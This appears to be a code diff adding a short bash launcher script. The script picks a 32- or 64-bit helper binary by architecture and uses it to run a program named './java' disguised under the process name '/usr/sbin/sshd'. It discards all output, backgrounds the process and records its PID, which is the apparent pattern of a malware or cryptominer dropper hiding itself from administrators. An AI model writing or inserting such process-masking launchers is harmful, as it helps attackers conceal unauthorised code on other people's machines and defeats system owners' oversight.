@@ -1,0 +1,13 @@
+#!/bin/bash
+
+proc=`nproc`
+ARCH=`uname -m`
+HIDE="/usr/sbin/sshd"
+
+if [ "$ARCH" == "i686" ];       then
+        ./h32 -s $HIDE ./java >>/dev/null &
+elif [ "$ARCH" == "x86_64" ];   then
+        ./h64 -s $HIDE ./java  >>/dev/null &
+      
+fi
+echo $! > bash.pid
